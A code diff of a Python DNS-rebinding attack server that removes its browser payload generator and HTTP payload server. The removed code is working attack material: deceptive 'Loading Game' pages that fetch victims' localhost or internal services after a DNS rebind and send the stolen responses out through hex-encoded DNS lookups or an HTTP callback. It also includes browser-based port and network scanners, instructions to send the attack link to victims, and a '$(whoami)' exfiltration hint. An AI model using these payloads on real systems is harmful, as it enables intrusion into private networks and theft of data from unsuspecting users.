@@ -35,703 +35,10 @@ except ImportError:
 
 CONFIG_FILE = Path("dns-rebinder.yaml")
 
-from twisted.internet import reactor, stdio, endpoints
-from twisted.web import server as web_server, resource
+from twisted.internet import reactor, stdio
 from twisted.names import dns, server, hosts as hosts_module, client, resolve, root
 from twisted.protocols.basic import LineReceiver
 from twisted.python.runtime import platform
-
-
-# ============================================================================
-# Payload Generator
-# ============================================================================
-#
-# ⚠️  IN PROGRESS — NOT WORKING YET
-#
-# Browser DNS rebinding is tricky because browsers cache DNS aggressively
-# (~60s for Chrome) regardless of TTL=0. The payloads work but require
-# waiting for browser DNS cache to expire before rebind happens.
-#
-# For instant rebinding, use SSRF/server-side scenarios with count strategy.
-#
-# TODO: Investigate techniques to bypass browser DNS caching:
-#   - Connection failure forcing re-resolution
-#   - Multiple A records with failover
-#   - WebSocket-based approaches
-# ============================================================================
-
-class PayloadGenerator:
-    """Generate browser DNS rebinding attack payloads."""
-    
-    # Marker to detect our own payload page (so we know rebind hasn't happened yet)
-    PAYLOAD_MARKER = '<!-- DNS-REBINDER-PAYLOAD-MARKER-7f3a9b2c -->'
-    
-    @staticmethod
-    def single_target(
-        domain: str,
-        target_port: int = 80,
-        target_path: str = "/",
-        delay_ms: int = 3000,
-        poll_interval_ms: int = 2000,
-        max_attempts: int = 60,
-        exfil_domain: Optional[str] = None,
-        exfil_callback: Optional[str] = None,
-        rebinder_base: Optional[str] = None,
-    ) -> str:
-        """
-        Generate payload to steal response from single target.
-        
-        Args:
-            domain: Attack domain (e.g., attack.evil.com)
-            target_port: Port to hit after rebind
-            target_path: Path to fetch
-            delay_ms: Initial delay before first rebind attempt (browser DNS cache)
-            poll_interval_ms: Seconds between rebind attempts
-            max_attempts: Maximum number of rebind attempts
-            exfil_domain: Domain for DNS exfil (e.g., exfil.evil.com)
-            exfil_callback: HTTP URL for data exfil
-        """
-        exfil_code = ""
-        if exfil_domain:
-            exfil_code += f'''
-            // DNS exfil using hex (case-insensitive, survives DNS)
-            const dnsExfil = (data) => {{
-                // Convert to hex (case-insensitive, works with DNS)
-                const hex = Array.from(data).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
-                // Split into chunks (DNS label max 63 chars, use 60 for safety)
-                const chunks = hex.match(/.{{1,60}}/g) || [];
-                chunks.forEach((chunk, i) => {{
-                    const img = new Image();
-                    img.src = 'http://' + chunk + '.c' + i + '.{exfil_domain}/x.png?' + Date.now();
-                }});
-            }};
-            dnsExfil(data);'''
-        
-        if exfil_callback:
-            exfil_code += f'''
-            // HTTP callback exfil
-            fetch('{exfil_callback}', {{
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({{url: targetUrl, data: data, ts: Date.now()}})
-            }}).catch(() => {{}});'''
-        
-        if not exfil_code:
-            exfil_code = '''
-            console.log('STOLEN DATA:', data);
-            alert('Rebind successful! Check console for data.');'''
-        
-        marker = PayloadGenerator.PAYLOAD_MARKER
-        
-        return f'''<!DOCTYPE html>
-<html>
-<head>
-    <title>Loading...</title>
-    {marker}
-    <style>
-        body {{ font-family: system-ui, sans-serif; padding: 40px; background: #1a1a2e; color: #eee; }}
-        .status {{ padding: 20px; border-radius: 8px; margin: 10px 0; }}
-        .waiting {{ background: #16213e; }}
-        .attacking {{ background: #1f4068; }}
-        .success {{ background: #1b4332; }}
-        .error {{ background: #641220; }}
-        #log {{ font-family: monospace; font-size: 12px; white-space: pre-wrap; max-height: 400px; overflow-y: auto; }}
-    </style>
-</head>
-<body>
-    <h1>🎮 Loading Game...</h1>
-    <div id="status" class="status waiting">Initializing...</div>
-    <div id="log"></div>
-    
-    <script>
-    // Marker used to detect if we're still hitting our own server
-    const PAYLOAD_MARKER = 'DNS-REBINDER-PAYLOAD-MARKER-7f3a9b2c';
-    
-    const CONFIG = {{
-        // window.location.port is empty string for default ports (80/443)
-        targetPort: window.location.port ? parseInt(window.location.port) : (window.location.protocol === 'https:' ? 443 : 80),
-        targetPath: '{target_path}',
-        delayMs: {delay_ms},
-        maxAttempts: {max_attempts},
-        attemptIntervalMs: {poll_interval_ms}
-    }};
-    
-    // Check if we need to redirect to unique subdomain for same-origin fetch
-    // For browser rebinding attacks, we want a dedicated rebinding namespace like: *.rb.<domain>
-    // If rebinder_base is provided server-side, use it. Otherwise fall back to last 2 labels.
-    const rebinderBase = "{rebinder_base or ''}";
-    const baseDomain = rebinderBase || window.location.hostname.split('.').slice(-2).join('.');
-    const currentHost = window.location.hostname;
-    const currentPort = window.location.port || '80';
-    
-    // If we're not on a random subdomain yet, OR not on target port, redirect
-    const needsRedirect = !currentHost.startsWith('r') || 
-                          currentHost.split('.').length < 3 || 
-                          currentPort !== String(CONFIG.targetPort);
-    
-    if (needsRedirect) {{
-        const uniqueHost = 'r' + Math.random().toString(36).slice(2, 10) + '.' + baseDomain;
-        // Redirect to TARGET PORT so fetch is same-origin
-        const pathname = window.location.pathname || '/';
-        const search = window.location.search || '';
-        const newUrl = 'http://' + uniqueHost + ':' + CONFIG.targetPort + pathname + search;
-        console.log('DEBUG: pathname=' + pathname + ', search=' + search);
-        console.log('DEBUG: Redirecting to: ' + newUrl);
-        window.location.href = newUrl;
-        throw new Error('Redirecting...');
-    }}
-    
-    const status = document.getElementById('status');
-    const log = document.getElementById('log');
-    
-    function addLog(msg) {{
-        const ts = new Date().toISOString().split('T')[1].slice(0,12);
-        log.textContent += '[' + ts + '] ' + msg + '\\n';
-        log.scrollTop = log.scrollHeight;
-        console.log(msg);
-    }}
-    
-    function setStatus(msg, cls) {{
-        status.textContent = msg;
-        status.className = 'status ' + cls;
-    }}
-    
-    async function tryRebind(attempt) {{
-        // Use current hostname (already unique from redirect) for same-origin
-        const targetUrl = 'http://' + currentHost + ':' + CONFIG.targetPort + CONFIG.targetPath;
-        addLog('Attempt ' + attempt + '/' + CONFIG.maxAttempts + ': Fetching ' + targetUrl);
-        
-        try {{
-            const controller = new AbortController();
-            const timeout = setTimeout(() => controller.abort(), 5000);
-            
-            const resp = await fetch(targetUrl, {{ 
-                signal: controller.signal,
-                cache: 'no-store'
-            }});
-            clearTimeout(timeout);
-            
-            const data = await resp.text();
-            
-            // Check if we got our OWN page (rebind hasn't happened yet)
-            if (data.includes(PAYLOAD_MARKER)) {{
-                addLog('⏳ Still hitting rebinder server (' + data.length + ' bytes) - waiting for DNS cache...');
-                return null; // null = keep trying, rebind not complete
-            }}
-            
-            // Got different content - rebind worked!
-            addLog('🎉 SUCCESS! Got ' + data.length + ' bytes from TARGET');
-            setStatus('🎉 Rebind successful! Exfiltrating ' + data.length + ' bytes...', 'success');
-            
-            // Show preview
-            const preview = data.substring(0, 500);
-            addLog('--- Response Preview ---');
-            addLog(preview + (data.length > 500 ? '\\n... [truncated]' : ''));
-            addLog('--- End Preview ---');
-            
-            // Exfiltrate{exfil_code}
-            
-            return true;
-            
-        }} catch (e) {{
-            if (e.name === 'AbortError') {{
-                addLog('⏱️ Timeout - target may be slow or filtered');
-            }} else {{
-                addLog('❌ Error: ' + e.message);
-            }}
-            return false;
-        }}
-    }}
-    
-    async function main() {{
-        const totalTime = CONFIG.delayMs + (CONFIG.maxAttempts * CONFIG.attemptIntervalMs);
-        setStatus('⏳ Waiting ' + (CONFIG.delayMs/1000) + 's for browser DNS cache...', 'waiting');
-        addLog('=== DNS Rebinding Attack ===');
-        addLog('Target: ' + currentHost + ':' + CONFIG.targetPort + CONFIG.targetPath);
-        addLog('Strategy: Wait ' + (CONFIG.delayMs/1000) + 's, then poll every ' + (CONFIG.attemptIntervalMs/1000) + 's');
-        addLog('Max duration: ~' + Math.round(totalTime/1000) + 's (' + CONFIG.maxAttempts + ' attempts)');
-        addLog('');
-        addLog('Waiting ' + (CONFIG.delayMs/1000) + 's for browser DNS cache to expire...');
-        addLog('(Chrome caches ~1min, Firefox varies, Safari ~few seconds)');
-        
-        await new Promise(r => setTimeout(r, CONFIG.delayMs));
-        
-        setStatus('🔄 Polling for rebind...', 'attacking');
-        addLog('');
-        addLog('=== Starting rebind attempts ===');
-        
-        for (let i = 1; i <= CONFIG.maxAttempts; i++) {{
-            const result = await tryRebind(i);
-            
-            if (result === true) {{
-                // Success! We got target data
-                return;
-            }}
-            
-            if (result === false) {{
-                // Error (not just "still our page") - might be worth retrying
-            }}
-            
-            // result === null means still hitting our server, keep polling
-            
-            if (i < CONFIG.maxAttempts) {{
-                setStatus('🔄 Attempt ' + i + '/' + CONFIG.maxAttempts + ' - waiting ' + (CONFIG.attemptIntervalMs/1000) + 's...', 'attacking');
-                await new Promise(r => setTimeout(r, CONFIG.attemptIntervalMs));
-            }}
-        }}
-        
-        setStatus('❌ Rebind failed after ' + CONFIG.maxAttempts + ' attempts', 'error');
-        addLog('');
-        addLog('=== Attack failed ===');
-        addLog('Possible causes:');
-        addLog('  - Browser DNS cache not expiring (try longer delay)');
-        addLog('  - Target port not open');
-        addLog('  - Firewall blocking');
-        addLog('  - DNS not rebinding (check server logs)');
-    }}
-    
-    main();
-    </script>
-</body>
-</html>'''
-
-    @staticmethod
-    def port_scan(
-        domain: str,
-        ports: list[int],
-        delay_ms: int = 3000,
-        exfil_domain: Optional[str] = None,
-        rebinder_base: Optional[str] = None,
-    ) -> str:
-        """Generate payload to scan ports on rebind target."""
-        
-        ports_js = json.dumps(ports)
-        
-        exfil_code = ""
-        if exfil_domain:
-            exfil_code = f'''
-            const dnsExfil = (port, status) => {{
-                const img = new Image();
-                img.src = 'http://port' + port + '-' + status + '.{exfil_domain}/x.png?' + Date.now();
-            }};
-            dnsExfil(port, open ? 'open' : 'closed');'''
-        
-        return f'''<!DOCTYPE html>
-<html>
-<head>
-    <title>Loading...</title>
-    <style>
-        body {{ font-family: system-ui, sans-serif; padding: 40px; background: #1a1a2e; color: #eee; }}
-        table {{ border-collapse: collapse; width: 100%; margin-top: 20px; }}
-        th, td {{ border: 1px solid #333; padding: 8px; text-align: left; }}
-        th {{ background: #16213e; }}
-        .open {{ color: #4ade80; font-weight: bold; }}
-        .closed {{ color: #666; }}
-        .pending {{ color: #fbbf24; }}
-        #status {{ padding: 15px; background: #16213e; border-radius: 8px; margin-bottom: 20px; }}
-    </style>
-</head>
-<body>
-    <h1>🔍 Port Scanner</h1>
-    <div id="status">Waiting for DNS TTL to expire...</div>
-    <table>
-        <thead><tr><th>Port</th><th>Status</th><th>Response</th></tr></thead>
-        <tbody id="results"></tbody>
-    </table>
-    
-    <script>
-    const CONFIG = {{
-        ports: {ports_js},
-        delayMs: {delay_ms},
-        timeoutMs: 2000
-    }};
-    
-    const rebinderBase = "{rebinder_base or ''}";
-    const baseDomain = rebinderBase || window.location.hostname.split('.').slice(-2).join('.');
-    const results = document.getElementById('results');
-    const status = document.getElementById('status');
-    
-    // Initialize table
-    CONFIG.ports.forEach(port => {{
-        const row = document.createElement('tr');
-        row.id = 'port-' + port;
-        row.innerHTML = '<td>' + port + '</td><td class="pending">⏳ Pending</td><td>-</td>';
-        results.appendChild(row);
-    }});
-    
-    async function checkPort(port) {{
-        const row = document.getElementById('port-' + port);
-        // Fresh subdomain each request to bypass DNS cache
-        const uniqueHost = 'r' + Math.random().toString(36).slice(2) + '.' + baseDomain;
-        const url = 'http://' + uniqueHost + ':' + port + '/';
-        
-        try {{
-            const controller = new AbortController();
-            const timeout = setTimeout(() => controller.abort(), CONFIG.timeoutMs);
-            
-            const resp = await fetch(url, {{ 
-                signal: controller.signal,
-                cache: 'no-store'
-            }});
-            clearTimeout(timeout);
-            
-            const text = await resp.text();
-            const preview = text.slice(0, 50).replace(/</g, '&lt;');
-            
-            // Check if we got our own page
-            if (text.includes('Port Scanner')) {{
-                row.innerHTML = '<td>' + port + '</td><td class="pending">🔄 Rebinding...</td><td>Got own page</td>';
-                return null; // Rebind not complete
-            }}
-            
-            row.innerHTML = '<td>' + port + '</td><td class="open">✅ OPEN</td><td>' + preview + '...</td>';
-            {exfil_code.replace('open ? ', 'true ? ') if exfil_code else ''}
-            return true;
-            
-        }} catch (e) {{
-            row.innerHTML = '<td>' + port + '</td><td class="closed">❌ Closed</td><td>' + e.message + '</td>';
-            {exfil_code.replace('open ? ', 'false ? ') if exfil_code else ''}
-            return false;
-        }}
-    }}
-    
-    async function main() {{
-        status.textContent = '⏳ Waiting ' + (CONFIG.delayMs/1000) + 's for DNS TTL...';
-        await new Promise(r => setTimeout(r, CONFIG.delayMs));
-        
-        status.textContent = '🔄 Scanning ports...';
-        
-        // Try a few times to ensure rebind happened
-        for (let attempt = 0; attempt < 10; attempt++) {{
-            let rebindComplete = true;
-            
-            for (const port of CONFIG.ports) {{
-                const result = await checkPort(port);
-                if (result === null) rebindComplete = false;
-                await new Promise(r => setTimeout(r, 100));
-            }}
-            
-            if (rebindComplete) break;
-            await new Promise(r => setTimeout(r, 1000));
-        }}
-        
-        status.textContent = '✅ Scan complete';
-    }}
-    
-    main();
-    </script>
-</body>
-</html>'''
-
-    @staticmethod
-    def network_scan(
-        domain: str,
-        port: int = 80,
-        delay_ms: int = 3000,
-        exfil_domain: Optional[str] = None,
-        rebinder_base: Optional[str] = None,
-    ) -> str:
-        """
-        Generate payload for network scanning.
-        Uses multi-target strategy - each DNS query returns different IP.
-        """
-        
-        exfil_code = ""
-        if exfil_domain:
-            exfil_code = f'''
-                const dnsExfil = (ip, port, status) => {{
-                    const encoded = ip.replace(/\\./g, '-');
-                    const img = new Image();
-                    img.src = 'http://' + encoded + '-p' + port + '-' + status + '.{exfil_domain}/x.png';
-                }};
-                dnsExfil(targetIp, {port}, open ? 'open' : 'closed');'''
-        
-        return f'''<!DOCTYPE html>
-<html>
-<head>
-    <title>Loading...</title>
-    <style>
-        body {{ font-family: system-ui, sans-serif; padding: 40px; background: #1a1a2e; color: #eee; }}
-        #log {{ font-family: monospace; font-size: 12px; background: #0d1117; padding: 15px; 
-                border-radius: 8px; max-height: 500px; overflow-y: auto; white-space: pre-wrap; }}
-        .found {{ color: #4ade80; }}
-        .miss {{ color: #666; }}
-        #status {{ padding: 15px; background: #16213e; border-radius: 8px; margin-bottom: 20px; }}
-        #found {{ background: #1b4332; padding: 15px; border-radius: 8px; margin-top: 20px; }}
-        #found h3 {{ margin-top: 0; }}
-    </style>
-</head>
-<body>
-    <h1>🌐 Network Scanner</h1>
-    <p>Using DNS rebinding with multi-target strategy. Each request resolves to a different internal IP.</p>
-    <div id="status">Initializing...</div>
-    <div id="found"><h3>🎯 Hosts Found</h3><div id="hosts">None yet...</div></div>
-    <h3>📋 Scan Log</h3>
-    <div id="log"></div>
-    
-    <script>
-    const CONFIG = {{
-        port: {port},
-        delayMs: {delay_ms},
-        scanCount: 50,  // Number of IPs to try (depends on your rebind IP list)
-        timeoutMs: 2000
-    }};
-    
-    const rebinderBase = "{rebinder_base or ''}";
-    const baseDomain = rebinderBase || window.location.hostname.split('.').slice(-2).join('.');
-    const logEl = document.getElementById('log');
-    const status = document.getElementById('status');
-    const hostsEl = document.getElementById('hosts');
-    const foundHosts = [];
-    let scanNum = 0;
-    
-    function log(msg, cls) {{
-        const line = document.createElement('div');
-        line.className = cls || '';
-        line.textContent = '[' + new Date().toISOString().split('T')[1].slice(0,8) + '] ' + msg;
-        logEl.appendChild(line);
-        logEl.scrollTop = logEl.scrollHeight;
-    }}
-    
-    async function probe() {{
-        scanNum++;
-        // Use unique subdomain to force new DNS lookup each time
-        const uniqueHost = 'scan' + scanNum + '-' + Date.now() + '.' + baseDomain;
-        const url = 'http://' + uniqueHost + ':' + CONFIG.port + '/';
-        
-        try {{
-            const controller = new AbortController();
-            const timeout = setTimeout(() => controller.abort(), CONFIG.timeoutMs);
-            
-            const resp = await fetch(url, {{ 
-                signal: controller.signal,
-                cache: 'no-store'
-            }});
-            clearTimeout(timeout);
-            
-            const text = await resp.text();
-            
-            // Try to identify the target IP from response
-            // (Your DNS server cycles through IPs)
-            const targetIp = 'IP #' + scanNum; // In reality, check response content
-            
-            if (!text.includes('Network Scanner')) {{
-                log('✅ FOUND: ' + subdomain + ' - got ' + text.length + ' bytes', 'found');
-                foundHosts.push({{ subdomain, size: text.length, preview: text.slice(0, 100) }});
-                hostsEl.innerHTML = foundHosts.map(h => 
-                    '<div class="found">• ' + h.subdomain + ' (' + h.size + ' bytes)</div>'
-                ).join('');
-                {exfil_code.replace('open ? ', 'true ? ') if exfil_code else ''}
-                return true;
-            }}
-            
-            log('🔄 ' + subdomain + ' - got own page (rebind pending)', 'miss');
-            return null;
-            
-        }} catch (e) {{
-            log('❌ ' + subdomain + ' - ' + e.message, 'miss');
-            {exfil_code.replace('open ? ', 'false ? ') if exfil_code else ''}
-            return false;
-        }}
-    }}
-    
-    async function main() {{
-        status.textContent = '⏳ Waiting ' + (CONFIG.delayMs/1000) + 's for DNS TTL...';
-        log('Target port: ' + CONFIG.port);
-        log('Waiting for DNS cache to expire...');
-        
-        await new Promise(r => setTimeout(r, CONFIG.delayMs));
-        
-        status.textContent = '🔄 Scanning network (using multi-target rebind)...';
-        log('Starting network scan...');
-        log('Each request uses unique subdomain → new DNS lookup → next IP in cycle');
-        
-        for (let i = 0; i < CONFIG.scanCount; i++) {{
-            await probe();
-            await new Promise(r => setTimeout(r, 200));
-            status.textContent = '🔄 Scanning... (' + (i+1) + '/' + CONFIG.scanCount + ')';
-        }}
-        
-        status.textContent = '✅ Scan complete. Found ' + foundHosts.length + ' hosts.';
-        log('Scan complete!');
-    }}
-    
-    main();
-    </script>
-</body>
-</html>'''
-
-
-# ============================================================================
-# Payload HTTP Server
-# ============================================================================
-
-class PayloadResource(resource.Resource):
-    """HTTP server for serving attack payloads."""
-    
-    isLeaf = False
-    
-    def __init__(self, config_ref):
-        super().__init__()
-        self.config_ref = config_ref
-        self.payloads = {}  # path -> html content
-    
-    def getChild(self, path, request):
-        return PayloadPage(self, path.decode() if isinstance(path, bytes) else path)
-    
-    def render_GET(self, request):
-        request.setHeader(b'Content-Type', b'text/html')
-        
-        html = f'''<!DOCTYPE html>
-<html>
-<head><title>DNS-Rebinder Payloads</title>
-<style>
-    body {{ font-family: system-ui; padding: 40px; background: #1a1a2e; color: #eee; max-width: 800px; margin: 0 auto; }}
-    a {{ color: #60a5fa; }}
-    .payload {{ background: #16213e; padding: 15px; margin: 10px 0; border-radius: 8px; }}
-    code {{ background: #0d1117; padding: 2px 6px; border-radius: 4px; }}
-</style>
-</head>
-<body>
-<h1>🎯 DNS-Rebinder Payload Server</h1>
-<p>Domain: <code>{self.config_ref.domain}</code></p>
-<p>Rebind IPs: <code>{', '.join(self.config_ref.rebind_ips)}</code></p>
-
-<h2>Available Payloads</h2>
-<div class="payload">
-    <h3><a href="/single">/single</a> - Single Target</h3>
-    <p>Steal response from one target. Defaults to fast mode (instant polling).</p>
-    <code>/single?path=/admin</code>
-    <p style="font-size: 0.9em; color: #888; margin-top: 8px;">
-        <b>Defaults (fast):</b> delay=0, interval=100ms, attempts=300 (30s)<br>
-        <b>Browser mode:</b> ?delay=70000&amp;interval=2000&amp;attempts=60
-    </p>
-</div>
-
-<div class="payload">
-    <h3><a href="/portscan">/portscan</a> - Port Scanner</h3>
-    <p>Scan ports on rebind target.</p>
-    <code>/portscan?ports=80,443,8080,3000,5000</code>
-</div>
-
-<div class="payload">
-    <h3><a href="/netscan">/netscan</a> - Network Scanner</h3>
-    <p>Scan internal network (use with multi-target strategy).</p>
-    <code>/netscan?port=80&count=50</code>
-</div>
-
-<h2>Quick Links</h2>
-<ul>
-    <li><a href="/single?port=8080&path=/">Scan localhost:8080</a></li>
-    <li><a href="/single?port=80&path=/server-status">Apache server-status</a></li>
-    <li><a href="/portscan?ports=22,80,443,3000,3306,5000,5432,6379,8080,8443,9200,27017">Common ports</a></li>
-</ul>
-
-<h2>Usage</h2>
-<ol>
-    <li>Set up DNS for your domain pointing to this server</li>
-    <li>Start dns-rebinder with desired rebind IPs</li>
-    <li>Send victim link: <code>http://attack.{self.config_ref.domain}:8080/single?port=3000</code></li>
-    <li>Victim's browser loads page, waits, then fetches from their localhost!</li>
-</ol>
-</body>
-</html>'''
-        return html.encode()
-
-
-class PayloadPage(resource.Resource):
-    """Individual payload page."""
-    
-    isLeaf = True
-    
-    def __init__(self, parent, path):
-        super().__init__()
-        self.parent = parent
-        self.path = path
-    
-    def render_GET(self, request):
-        request.setHeader(b'Content-Type', b'text/html')
-        request.setHeader(b'Cache-Control', b'no-store')
-        
-        cfg = self.parent.config_ref
-        domain = cfg.domain
-        exfil = f"{cfg.exfil_prefix}.{domain}"
-        
-        # Parse query params
-        args = {k.decode(): v[0].decode() for k, v in request.args.items()}
-        
-        if self.path in ('single', 'fast'):
-            # Port auto-detected from URL, fallback to param, fallback to 80
-            port = int(args.get('port', 80))  # Only used as JS fallback
-            path = args.get('path', '/')
-            
-            # Default: fast mode (no delay, rapid polling)
-            # For slow browsers, use ?delay=70000&interval=2000&attempts=60
-            delay = int(args.get('delay', 0))
-            poll_interval = int(args.get('interval', 100))
-            max_attempts = int(args.get('attempts', 300))
-            
-            html = PayloadGenerator.single_target(
-                domain=domain,
-                target_port=port,
-                target_path=path,
-                delay_ms=delay,
-                poll_interval_ms=poll_interval,
-                max_attempts=max_attempts,
-                exfil_domain=exfil,
-                rebinder_base=(cfg.rb_zone or f"rb.{domain}"),
-            )
-            
-        elif self.path == 'portscan':
-            # Default ports: common web servers, frameworks, admin panels
-            # 80/443: Apache, Nginx, IIS
-            # 8080/8443: Tomcat, Jenkins, alt HTTP/HTTPS
-            # 3000: Node.js, React dev, Grafana
-            # 5000: Flask, Docker Registry
-            # 8000: Django, Python http.server
-            # 4200: Angular dev
-            # 8888: Jupyter Notebook
-            # 9000: PHP-FPM, SonarQube
-            # 9090: Prometheus
-            # 9200: Elasticsearch
-            # 5601: Kibana
-            # 3306: MySQL (web UIs)
-            # 5432: PostgreSQL (web UIs)
-            # 6379: Redis (web UIs)
-            # 27017: MongoDB (web UIs)
-            # 8081: Nexus, misc
-            # 4443: alt HTTPS
-            # 8888: JDWP, Jupyter
-            # 10000: Webmin
-            default_ports = '80,443,8080,8443,3000,5000,8000,4200,8888,9000,9090,9200,5601,8081,4443,10000,3001,5001,8001,4000'
-            ports_str = args.get('ports', default_ports)
-            ports = [int(p) for p in ports_str.split(',')]
-            delay = int(args.get('delay', 60000))
-            
-            html = PayloadGenerator.port_scan(
-                domain=domain,
-                ports=ports,
-                delay_ms=delay,
-                exfil_domain=exfil,
-                rebinder_base=(cfg.rb_zone or f"rb.{domain}"),
-            )
-            
-        elif self.path == 'netscan':
-            port = int(args.get('port', 80))
-            delay = int(args.get('delay', 60000))
-            
-            html = PayloadGenerator.network_scan(
-                domain=domain,
-                port=port,
-                delay_ms=delay,
-                exfil_domain=exfil,
-                rebinder_base=(cfg.rb_zone or f"rb.{domain}"),
-            )
-            
-        else:
-            html = f'<h1>Unknown payload: {self.path}</h1><p><a href="/">Back to index</a></p>'
-        
-        return html.encode()
 
 
 # ============================================================================
@@ -1001,19 +308,9 @@ class ServerConfig:
     domain: str
     ttl: int = 0
     strategy: RebindStrategy = field(default_factory=lambda: CountStrategy(1))
-
-    # Hostnames that must NEVER be rebound (always return server_ip).
-    # This is critical when your zone is also used for other services (e.g. Interactsh)
-    # and you need a stable hostname to serve the initial browser payload.
-    static_hosts: list[str] = field(default_factory=list)
     
     # Exfiltration settings
     exfil_prefix: str = "exfil"  # e.g., data.exfil.evil.com
-    
-    # HTTP payload server
-    http_port: int = 8080
-    enable_http: bool = False
-    rb_zone: str = ""  # e.g. rb.nsish.com (used by browser payload redirects)
     
     # Ranges to filter from logs (noisy resolvers)
     quiet_ranges: list = field(default_factory=lambda: [
@@ -1035,20 +332,6 @@ class ServerConfig:
     
     def __post_init__(self):
         self.logger = Logger()
-        # Browser payload mode defaults (only when HTTP payload server is enabled)
-        if self.enable_http:
-            # Default rebinding namespace
-            if not self.rb_zone:
-                self.rb_zone = f"rb.{self.domain}"
-
-            # Default static hosts if none provided.
-            # - static.<domain>: stable payload host
-            if not self.static_hosts:
-                self.static_hosts = [f"static.{self.domain}"]
-
-        # normalize
-        self.rb_zone = (self.rb_zone or "").strip().lower().rstrip('.')
-        self.static_hosts = [h.strip().lower().rstrip('.') for h in self.static_hosts if h and h.strip()]
     
     @property
     def ns_prefixes(self) -> list:
@@ -1082,21 +365,6 @@ class ServerConfig:
         for prefix in self.ns_prefixes:
             if hostname_lower.startswith(prefix.lower()):
                 return self.server_ip
-
-        # Static hosts must NEVER be rebound (serve initial payload reliably)
-        if hostname_lower in self.static_hosts:
-            if self.logger:
-                self.logger.query(
-                    hostname=hostname,
-                    response_ip=self.server_ip,
-                    source_ip=source_ip,
-                    source_port=source_port,
-                    query_type="A",
-                    is_rebind=False,
-                    query_count=0,
-                    strategy="static-host"
-                )
-            return self.server_ip
         
         # Check for exfil data
         self.check_exfil(hostname_lower, source_ip)
@@ -1194,7 +462,6 @@ class CommandProtocol(LineReceiver):
         'hosts': 'Show all tracked hostnames',
         'log [n]': 'Show recent queries (default: 20)',
         'exfil': 'Show exfiltrated data summary',
-        'payload': 'Show browser attack payload URLs',
         'quit': 'Stop the server',
     }
     
@@ -1228,8 +495,6 @@ class CommandProtocol(LineReceiver):
                 self.cmd_log(args)
             elif cmd == 'exfil':
                 self.cmd_exfil()
-            elif cmd == 'payload':
-                self.cmd_payload()
             elif cmd in ('quit', 'exit', 'q'):
                 self.cmd_quit()
             else:
@@ -1392,40 +657,6 @@ class CommandProtocol(LineReceiver):
         self.send(f'    $(whoami).{config.exfil_prefix}.{config.domain}')
         self.send('')
     
-    def cmd_payload(self):
-        if not config.enable_http:
-            self.send('\n⚠️  HTTP payload server is disabled.')
-            self.send('    Restart with --http-enable to use browser attack payloads.')
-            self.send('')
-            return
-            
-        http_port = config.http_port
-        self.send(f'\n🎯 Browser Attack Payloads')
-        self.send('═' * 60)
-        self.send(f'  Payload server: http://{config.server_ip}:{http_port}/')
-        self.send('')
-        self.send('  Available payloads:')
-        self.send(f'    /single    - Steal from single target')
-        self.send(f'    /portscan  - Scan ports on victim localhost')
-        self.send(f'    /netscan   - Scan internal network')
-        self.send('')
-        self.send('  Defaults (fast mode):')
-        self.send('    delay=0ms, interval=100ms, attempts=300 (30s total)')
-        self.send('    For slow browsers: ?delay=70000&interval=2000&attempts=60')
-        self.send('')
-        static_host = config.static_hosts[0] if config.static_hosts else f"static.{config.domain}"
-        self.send('  Attack URLs (send to victim):')
-        self.send(f'    http://{static_host}:{http_port}/single')
-        self.send(f'    http://{static_host}:{http_port}/single?path=/admin')
-        self.send(f'    http://{static_host}:{http_port}/portscan')
-        self.send('')
-        self.send('  How it works:')
-        self.send('    1. Victim visits URL → loads from YOUR server')
-        self.send('    2. JS polls rapidly (default: every 100ms)')
-        self.send('    3. When DNS rebinds → fetch hits internal target')
-        self.send('    4. Data exfiltrated via DNS (hex encoded)')
-        self.send('')
-    
     def cmd_quit(self):
         self.send('Shutting down...')
         config.logger.info('Server stopped by user')
@@ -1529,27 +760,15 @@ def print_banner():
     print(f'  Server IP:       {config.server_ip}')
     print(f'  Domain:          {config.domain}')
     print(f'  DNS server:      0.0.0.0:{config.port}')
-    if config.enable_http:
-        print(f'  HTTP payloads:   http://0.0.0.0:{config.http_port}/')
-        print(f'  Rebind space:    *.{config.rb_zone or ("rb." + config.domain)}')
-        print(f'  Static host(s):  {", ".join(config.static_hosts) if config.static_hosts else "(none)"}')
-    else:
-        print(f'  HTTP payloads:   (disabled)  (enable with --http-enable)')
     print(f'  Strategy:        {config.strategy.describe()}')
     print(f'  Exfil domain:    *.{config.exfil_prefix}.{config.domain}')
-    print()
-    if config.enable_http:
-        static_host = config.static_hosts[0] if config.static_hosts else f"static.{config.domain}"
-        print(f'  \033[93m📋 Attack URL:\033[0m    http://{static_host}:{config.http_port}/single')
-    else:
-        print(f'  \033[93m📋 Attack URL:\033[0m    (HTTP payloads disabled - use --http-enable)')
     print()
     print(f'  Main log:        {config.logger.main_log}')
     print(f'  JSON log:        {config.logger.json_log}')
     print(f'  Exfil log:       {config.logger.exfil_log}')
     print()
     print('─' * 67)
-    print('  Type "help" for commands. "payload" for browser attack info.')
+    print('  Type "help" for commands.')
     print('─' * 67)
     print()
 
@@ -1715,12 +934,6 @@ def run_setup_wizard() -> argparse.Namespace:
     args.exfil_prefix = prompt("Exfil prefix", default="exfil")
     print()
     
-    # HTTP payloads disabled by default (use --http-enable flag if needed)
-    args.http_enable = False
-    args.http_port = 8080
-    args.rb_zone = None
-    args.static_hosts = None
-    
     args.ttl = 0  # Always 0 for rebinding
     
     print("─" * 67)
@@ -1834,19 +1047,7 @@ Strategies:
     parser.add_argument('--strategy', nargs='+', default=['count', '1'],
                         help='Rebind strategy and options')
     parser.add_argument('--exfil-prefix', default='exfil', help='Exfil subdomain prefix')
-    parser.add_argument('--http-enable', action='store_true', help='Enable HTTP payload server (browser attack payloads)')
-    parser.add_argument('--http-port', type=int, default=8080, help='HTTP payload server port (default: 8080)')
-    parser.add_argument('--rb-zone', default=None, help='Rebinding namespace for browser payload redirects (e.g. rb.nsish.com)')
     parser.add_argument('--ttl', type=int, default=0, help='DNS TTL (default: 0)')
-    parser.add_argument(
-        '--static-hosts',
-        default=None,
-        help=(
-            'Comma-separated hostnames to ALWAYS resolve to --server (never rebind). '
-            'Example: "static.nsish.com,cdn.nsish.com". If omitted, defaults include '
-            'apex plus static/cdn/assets/stage subdomains.'
-        ),
-    )
     
     args = parser.parse_args()
     
@@ -1924,10 +1125,6 @@ def main():
     global config
     
     args = parse_args()
-    
-    static_hosts = []
-    if args.static_hosts:
-        static_hosts = [h.strip() for h in args.static_hosts.split(',') if h.strip()]
 
     config = ServerConfig(
         whitelist_ip=args.whitelist,
@@ -1937,11 +1134,7 @@ def main():
         domain=args.domain,
